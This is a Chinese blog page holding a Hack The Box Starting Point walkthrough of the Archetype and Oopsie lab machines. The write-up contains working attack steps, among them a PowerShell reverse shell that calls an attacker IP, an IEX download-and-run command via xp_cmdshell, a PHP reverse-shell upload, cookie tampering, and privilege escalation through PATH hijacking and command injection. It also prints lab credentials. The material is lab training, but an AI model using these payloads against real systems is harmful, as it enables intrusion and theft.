<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>HTB-Starting Point | Atmet</title>
<meta name=keywords content="Hack The Box">
<meta name=description content="Archetype  目标：拿到用户权限与系统权限。
靶机IP：10.10.10.27。
 1、信息收集 先使用nmap看看靶机开放了什么端口：
sudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：">
<meta name=author content="DaChui">
<link rel=canonical href=https://oopsdc.tk/post/htb-starting-point/>
<link href=/assets/css/stylesheet.min.fe37c241822b208b1ade5508f8fdbbe116fdf98dae7ffe71501145355d4636b4.css integrity="sha256-/jfCQYIrIIsa3lUI+P274Rb9+Y2uf/5xUBFFNV1GNrQ=" rel="preload stylesheet" as=style>
<link rel=icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
<link rel=icon type=image/png sizes=16x16 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
<link rel=icon type=image/png sizes=32x32 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
<link rel=apple-touch-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
<link rel=mask-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<meta property="og:title" content="HTB-Starting Point">
<meta property="og:description" content="Archetype  目标：拿到用户权限与系统权限。
靶机IP：10.10.10.27。
 1、信息收集 先使用nmap看看靶机开放了什么端口：
sudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：">
<meta property="og:type" content="article">
<meta property="og:url" content="https://oopsdc.tk/post/htb-starting-point/"><meta property="og:image" content="https://oopsdc.tk/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="post">
<meta property="article:published_time" content="2021-09-12T15:54:16+08:00">
<meta property="article:modified_time" content="2021-09-12T15:54:16+08:00"><meta property="og:site_name" content="Atmet">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://oopsdc.tk/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E">
<meta name=twitter:title content="HTB-Starting Point">
<meta name=twitter:description content="Archetype  目标：拿到用户权限与系统权限。
靶机IP：10.10.10.27。
 1、信息收集 先使用nmap看看靶机开放了什么端口：
sudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://oopsdc.tk/post/"},{"@type":"ListItem","position":2,"name":"HTB-Starting Point","item":"https://oopsdc.tk/post/htb-starting-point/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB-Starting Point","name":"HTB-Starting Point","description":"Archetype  目标：拿到用户权限与系统权限。\n靶机IP：10.10.10.27。\n 1、信息收集 先使用nmap看看靶机开放了什么端口：\nsudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：","keywords":["Hack The Box"],"articleBody":"Archetype  目标：拿到用户权限与系统权限。\n靶机IP：10.10.10.27。\n 1、信息收集 先使用nmap看看靶机开放了什么端口：\nsudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：\nsmbclient -N -L //10.10.10.27/ # 参数讲解 N：匿名登录 L：获取共享资源列表 # 结果 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin backups Disk C$ Disk Default share IPC$ IPC Remote IPC SMB1 disabled -- no workgroup available 获取到了共享资源列表，说明允许匿名访问SMB服务，文件夹后面的$代表为隐藏文件夹，接下来我们匿名登录看一下backups文件夹的内容：\nsmbclient -N //10.10.10.27/backups # 列出当前目录下的文件 smb: \\ dir . D 0 Mon Jan 20 20:20:57 2020 .. D 0 Mon Jan 20 20:20:57 2020 prod.dtsConfig AR 609 Mon Jan 20 20:23:02 2020 10328063 blocks of size 4096. 8260548 blocks available # 下载prod.dtsConfig文件 smb: \\ get prod.dtsConfig getting file \\prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec) 下载的文件会默认存储在当前目录，查看prod.dtsConfig文件：\nvim prod.dtsConfig   =\"...\" GeneratedFromPackageName=\"...\" GeneratedFromPackageID=\"...\" GeneratedDate=\"20.1.2019 10:01:34\"/  =\"Property\" Path=\"\\Package.Connections[Destination].Properties[ConnectionString]\" ValueType=\"String\" Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;   这个文件包含了一些数据库连接参数的配置，我们得到帐密ARCHETYPE\\sql_svc，M3g4c0rp123。\nSQL Server有两种身份验证方式：操作系统身份验证和数据库身份验证。这里我们得到的应该是前者，ARCHETYPE代表主机名，sql_svc代表具有数据库登录权限的操作系统用户名，M3g4c0rp123就是密码。\n2、拿Shell 根据nmap扫描结果来看，靶机没有开启远程登录功能，所以可以从数据库下手。\n需要的工具：SecureAuthCorp/impacket: Impacket is a collection of Python classes for working with network protocols. (github.com)\n这是一个用Python编写的后工具集，本次渗透要用到其中的mssqlclient.py，安装过程不再赘述。\n使用操作系统身份验证登录数据库：\npython3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth # 输入密码后登录成功 # 数据库身份认证启用了TLS [*] Encryption required, switching to TLS # 当前数据库为master [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'. [*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commands 登录成功后使用SQL Server的IS_SRVROLEMEMBER('sysadmin')判断当前数据库用户是否具有sysadmin权限：\nSELECT IS_SRVROLEMEMBER('sysadmin') # 结果 -----------  1 返回结果为1，代表当前数据库用户具有sysadmin权限，可进一步尝试使用xp_cmdshell实现RCE：\n# sp_configure修改数据库配置的存储过程，当show advanced options参数为1时，才能够修改数据库配置中的某些高级选项，其中就有xp_cmdshell，因此需要先设置show advanced options参数 EXEC sp_configure 'show advanced options', 1 [*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install. # 提交上一步使用sp_configure存储过程更改的配置选项 reconfigure # 使用sp_configure存储过程启用xp_cmdshell参数，此参数启用后允许SQL Server调用操作系统命令 EXEC sp_configure 'xp_cmdshell', 1 [*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install. # 提交上一步使用 sp_configure存储过程更改的配置选项 reconfigure # 以上命令也可使用mssqlclient的shell命令一步实现 enable_xp_cmdshell [*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install. [*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install. 查看当前身份：\nxp_cmdshell \"whoami\" # 结果 output --------------------------------------------------------------------------------  archetype\\sql_svc NULL 查看是否存在开发环境：\nxp_cmdshell \"python\" # 结果 output --------------------------------------------------------------------------------  'python' is not recognized as an internal or external command, operable program or batch file. NULL 3、获取用户权限 根据之前nmap的扫描结果，靶机应该为Windows Server 2008 R2，在没有开发环境的情况下可以考虑从powershell入手，建立一个powershell的反向shell文件1.ps1：\n$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.62\",443); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2\u00261 | Out-String ); $sendback2 = $sendback + \"# \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close() 保存完文件后，不要切换目录，在当前目录起一个HTTP服务器：\npython3 -m http.server 80 开启本地监听：\nnc -lvvp 443 在数据库中执行命令下载并执行脚本：\nxp_cmdshell \"powershell \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://10.10.14.62/1.ps1\\\");\" 下载成功后可以看到Web服务器和nc都有对应的连接信息，切换到nc窗口，回车发现拿到了靶机的shell交互：\n# 查看当前用户身份 whoami # 结果 archetype\\sql_svc # 查看当前路径 pwd # 结果 Path ---- C:\\Windows\\system32 # 查看桌面文件 dir C:\\Users\\sql_svc\\Desktop Directory: C:\\Users\\sql_svc\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 2/25/2020 6:37 AM 32 user.txt # 查看user.txt type C:\\Users\\sql_svc\\Desktop\\user.txt 4、提权 查看powershell历史记录：\ntype C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt # 结果 net.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!! exit 发现administrator将文件夹\\Archetype\\backups映射到T盘，MEGACORP_4dm1n!!为密码。\n尝试使用impakcet中的psexec.py提权：\npython3 psexec.py administrator@10.10.10.27 # 连接信息 [*] Requesting shares on 10.10.10.27..... [*] Found writable share ADMIN$ [*] Uploading file TPMzHnhC.exe [*] Opening SVCManager on 10.10.10.27..... [*] Creating service yQAe on 10.10.10.27..... [*] Starting service yQAe..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation. All rights reserved. # 查看当前身份 C:\\Windows\\system32whoami nt authority\\system # 查看桌面目录 dir C:\\Users\\Administrator\\Desktop # 结果 Directory of C:\\Users\\Administrator\\Desktop 01/20/2020 06:42 AM  . 01/20/2020 06:42 AM  .. 02/25/2020 07:36 AM 32 root.txt 1 File(s) 32 bytes 2 Dir(s) 33,833,361,408 bytes free # 查看root.txt type C:\\Users\\Administrator\\Desktop\\root.txt Oopsie  目标：拿到用户权限与系统权限。\n靶机IP：10.10.10.28。\n 1、信息收集 nmap查看靶机信息：\nsudo nmap -sS -sV 10.10.10.28 # 结果 Nmap scan report for 10.10.10.28 (10.10.10.28) Host is up (0.37s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 开启22和80端口，直接访问网页，发现有一个登录关键字，但是没有对应的链接：\n可能是将登录页面隐藏了，可通过两种方法进一步挖掘：\n1、F12打开控制台查看页面元素，翻到最下面可以发现一个登录页面的js脚本：\nscript src=\"/cdn-cgi/login/script.js\"script 2、bp抓包查看站点地图：\n进入登录页面后尝试帐密admin/MEGACORP_4dm1n!!，密码为上一关获得的administrator 的密码。\n登录成功后有一个文件上传功能，点击后显示当前行为需要超级管理员权限，抓包看一下当前的请求包：\nGET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1\rHost: 10.10.10.28\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\rAccept-Language: en-US,en;q=0.5\rAccept-Encoding: gzip, deflate\rReferer: http://10.10.10.28/cdn-cgi/login/admin.php\rConnection: close\rCookie: user=34322; role=admin\rUpgrade-Insecure-Requests: 1\rCache-Control: max-age=0\r发现Cookie处有一个user字段和role字段对当前身份进行判断，我们把当前数据包发送至Inturder模块，对user值爆破试试：\n值为86575时，文件上传功能正常。\n但是这样跑太费时间了，再回头看看其他页面，发现访问Account页面时URL如下：\nhttp://10.10.10.28/cdn-cgi/login/admin.php?content=accounts\u0026id=1\rid的值应该有一些用处，尝试修改为1、2、3、4，发现到4时回显另一个用户的信息，bp抓包放进Intruder跑一下：\n同样获得了超级管理员的Access ID，接下来我们抓取访问文件上传页面的数据包，将user字段的值改为获取到的超级管理员的Access ID，转发后可成功进入文件上传页面，在选中文件后点击上传，再次修改转发包即可成功上传文件。\n2、获取用户权限 上传文件后，下一步肯定需要知道文件的上传路径，使用dirsearch扫一下目录：\npython3 dirsearch.py -u http://10.10.10.28/ # 结果 301 - 312B - /uploads - http://10.10.10.28/uploads/ 尝试上传一句话，蚁剑连接不上，使用Kali自带的PHP反弹Shell试试：\n# 将自带Shell复制一份到当前目录 cp /usr/share/webshells/php/php-reverse-shell.php ./ # 修改IP和port为本机信息 $ip = '' $port =  打开两个命令终端：\n# 终端1，监听本机端口 nc -lvvp  # 终端2，请求1.php curl http://10.10.10.28/uploads/1.php 运行完上述两条命令后，可以发现监听窗口反弹了一个Shell，权限为网站权限：\n$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) 切换到网站目录：\ncd /var/www/html # 通过ls命令查看当前目录文件，直到最终切换到/var/www/html/cdn-cgi/login目录，发现有如下文件 $ ls admin.php db.php index.php script.js # 查看db.php $ cat db.php = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage'); ? 我们得到了一个数据库的账号，接下来看看这个账号的信息：\n$ id robert uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker) 发现这个用户属于两个组，先查看一下这个用户的家目录：\n$ ls /home/robert user.txt user.txt就是用户的flag，接下来获取root的flag。\n3、提权 从bugtracker用户组入手，查找其是否拥有特殊权限：\n$ find -type f -group bugtracker 2/dev/null 命令没有回显，执行以下命令升级Shell：\nSHELL=/bin/bash script -q /dev/null 继续执行之前的命令：\nwww-data@oopsie:/$ find -type f -group bugtracker 2/dev/null find -type f -group bugtracker 2/dev/null ./usr/bin/bugtracker 切换到robert用户：\nwww-data@oopsie:/$ su - robert 查看bugtracker：\nrobert@oopsie:~$ ls -la /usr/bin/bugtracker ls -la /usr/bin/bugtracker -rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker 发现其具有s权限，其作用在于用户可使用其所有者权限来运行程序，也就是说，在用户执行bugtracker程序时，将获取文件所有者，即root的权限及UID、GID。\n运行bugtracker看看：\nrobert@oopsie:~$ bugtracker bugtracker ------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 1 1 --------------- Binary package hint: ev-engine-lib Version: 3.3.3-1 Reproduce: When loading library in firmware it seems to be crashed What you expected to happen: Synchronized browsing to be enabled since it is enabled for that site. What happened instead: Synchronized browsing is disabled. Even choosing VIEW  SYNCHRONIZED BROWSING from menu does not stay enabled between connects. 使用strings命令打印出可打印字符：\nrobert@oopsie:~$ strings /usr/bin/bugtracker # 发现命令调用 cat /root/reports/ bugtracker调用了系统的cat命令输出位于/root/reports目录下的bug报告，且调用cat命令时并未使用绝对路径，即在当前用户的$PATH环境变量中有相应配置。\n方法一 我们可以创建一个名为cat的恶意命令并修改当前用户$PATH值，让bugtracker调用恶意构造的命令，进一步获取root权限。具体思路为：\n以robert的身份将/tmp目录设置为$PATH环境变量的第一个目录，然后切换到/tmp目录构造恶意cat命令并赋执行权，使bugtracker实际上调用了恶意构造的cat命令。\n命令如下：\nrobert@oopsie:~$ echo $PATH echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin robert@oopsie:~$ export PATH=/tmp:$PATH export PATH=/tmp:$PATH robert@oopsie:~$ echo $PATH echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin robert@oopsie:~$ cd /tmp cd /tmp robert@oopsie:/tmp$ echo '/bin/bash'  cat echo '/bin/bash'  cat robert@oopsie:/tmp$ chmod +x cat 再次运行bugtracker就会以root身份执行一个shell了。\n方法二（推荐） 只需在运行bugtracker时输入如下命令：\nrobert@oopsie:/tmp$ bugtracker bugtracker ------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 111;'/bin/bash' 111;'/bin/bash' --------------- cat: /root/reports/111: No such file or directory 此时便会以root身份执行一个shell：\nroot@oopsie:/tmp# id id uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker) 查看/root目录下所有文件：\nroot@oopsie:/tmp# ls -a /root\rls -a /root\r. .bash_history .cache .gnupg .profile root.txt .viminfo\r.. .bashrc .config .local reports .ssh\r下一关信息：\n切换到/root/.config/filezilla，查看filezilla.xml：\nroot@oopsie:/root/.config/filezilla# cat filezilla.xml 内容：\n    10.10.10.46 21 0 0 ftpuser mc@F1l3ZilL4 1 0 MODE_DEFAULT 0 Auto 0     本文链接：HTB-Starting Point | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","wordCount":"1101","inLanguage":"en","datePublished":"2021-09-12T15:54:16+08:00","dateModified":"2021-09-12T15:54:16+08:00","author":{"@type":"Person","name":"DaChui"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://oopsdc.tk/post/htb-starting-point/"},"publisher":{"@type":"Organization","name":"Atmet","logo":{"@type":"ImageObject","url":"https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<noscript>
<style type=text/css>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://oopsdc.tk/ accesskey=h title="Home (Alt + H)">Home</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu onscroll=menu_on_scroll()>
<li>
<a href=https://oopsdc.tk/archives/ title=Archives>
<span>Archives</span>
</a>
</li>
<li>
<a href=https://oopsdc.tk/links/ title=Links>
<span>Links</span>
</a>
</li>
<li>
<a href=https://oopsdc.tk/search/ title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
<li>
<a href=https://oopsdc.tk/tags/ title=Tags>
<span>Tags</span>
</a>
</li></ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs>
<a href=https://oopsdc.tk/>Home</a>&nbsp;»&nbsp;<a href=https://oopsdc.tk/post/>Posts</a>
</div>
<h1 class=post-title>
HTB-Starting Point
</h1>
<div class=post-meta>
September 12, 2021&nbsp;·&nbsp;6 min&nbsp;·&nbsp;DaChui
</div>
</header>
<div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<div class=details>Table of Contents</div>
</summary>
<div class=inner><ul><li>
<a href=#archetype aria-label=Archetype>Archetype</a><ul>
<li>
<a href=#1%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86 aria-label=1、信息收集>1、信息收集</a></li><li>
<a href=#2%e6%8b%bfshell aria-label=2、拿Shell>2、拿Shell</a></li><li>
<a href=#3%e8%8e%b7%e5%8f%96%e7%94%a8%e6%88%b7%e6%9d%83%e9%99%90 aria-label=3、获取用户权限>3、获取用户权限</a></li><li>
<a href=#4%e6%8f%90%e6%9d%83 aria-label=4、提权>4、提权</a></li></ul>
</li><li>
<a href=#oopsie aria-label=Oopsie>Oopsie</a><ul>
<li>
<a href=#1%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86-1 aria-label=1、信息收集>1、信息收集</a></li><li>
<a href=#2%e8%8e%b7%e5%8f%96%e7%94%a8%e6%88%b7%e6%9d%83%e9%99%90 aria-label=2、获取用户权限>2、获取用户权限</a></li><li>
<a href=#3%e6%8f%90%e6%9d%83 aria-label=3、提权>3、提权</a><ul>
<li>
<a href=#%e6%96%b9%e6%b3%95%e4%b8%80 aria-label=方法一>方法一</a></li><li>
<a href=#%e6%96%b9%e6%b3%95%e4%ba%8c%e6%8e%a8%e8%8d%90 aria-label=方法二（推荐）>方法二（推荐）</a></li></ul>
</li></ul>
</li></ul>
</div>
</details>
</div>
<div class=post-content>
<h1 id=archetype>Archetype<a hidden class=anchor aria-hidden=true href=#archetype>#</a></h1>
<blockquote>
<p>目标：拿到用户权限与系统权限。</p>
<p>靶机IP：10.10.10.27。</p>
</blockquote>
<h2 id=1信息收集>1、信息收集<a hidden class=anchor aria-hidden=true href=#1信息收集>#</a></h2>
<p>先使用<code>nmap</code>看看靶机开放了什么端口：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sudo nmap -sS -sV 10.10.10.27

<span style=color:#75715e># 参数讲解</span>
sS：使用SYN半开放式扫描，扫描快，隐蔽性高
sV：探测服务版本

<span style=color:#75715e># 扫描结果</span>
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.27 <span style=color:#f92672>(</span>10.10.10.27<span style=color:#f92672>)</span>
Host is up <span style=color:#f92672>(</span>0.28s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>996</span> closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server <span style=color:#ae81ff>2008</span> R2 - <span style=color:#ae81ff>2012</span> microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server <span style=color:#ae81ff>2017</span> 14.00.1000
Service Info: OSs: Windows, Windows Server <span style=color:#ae81ff>2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows
</code></pre></div><p>比较容易入手的就是<code>445端口</code>对应的<code>SMB服务</code>，<code>1433</code>是<code>SQL Server</code>的默认端口。先尝试能否匿名访问<code>SMB服务</code>，这里使用<code>Kali</code>预装的<code>smbclient</code>：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>smbclient -N -L //10.10.10.27/

<span style=color:#75715e># 参数讲解</span>
N：匿名登录
L：获取共享资源列表

<span style=color:#75715e># 结果</span>
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
</code></pre></div><p>获取到了共享资源列表，说明允许匿名访问<code>SMB服务</code>，文件夹后面的<code>$</code>代表为隐藏文件夹，接下来我们匿名登录看一下<code>backups</code>文件夹的内容：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>smbclient -N //10.10.10.27/backups

<span style=color:#75715e># 列出当前目录下的文件</span>
smb: <span style=color:#ae81ff>\&gt;</span> dir
  .                                   D        <span style=color:#ae81ff>0</span>  Mon Jan <span style=color:#ae81ff>20</span> 20:20:57 <span style=color:#ae81ff>2020</span>
  ..                                  D        <span style=color:#ae81ff>0</span>  Mon Jan <span style=color:#ae81ff>20</span> 20:20:57 <span style=color:#ae81ff>2020</span>
  prod.dtsConfig                     AR      <span style=color:#ae81ff>609</span>  Mon Jan <span style=color:#ae81ff>20</span> 20:23:02 <span style=color:#ae81ff>2020</span>

		<span style=color:#ae81ff>10328063</span> blocks of size 4096. <span style=color:#ae81ff>8260548</span> blocks available

<span style=color:#75715e># 下载prod.dtsConfig文件</span>
smb: <span style=color:#ae81ff>\&gt;</span> get prod.dtsConfig
getting file <span style=color:#ae81ff>\p</span>rod.dtsConfig of size <span style=color:#ae81ff>609</span> as prod.dtsConfig <span style=color:#f92672>(</span>0.5 KiloBytes/sec<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>average 0.5 KiloBytes/sec<span style=color:#f92672>)</span>
</code></pre></div><p>下载的文件会默认存储在当前目录，查看<code>prod.dtsConfig</code>文件：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>vim prod.dtsConfig

&lt;DTSConfiguration&gt;
    &lt;DTSConfigurationHeading&gt;
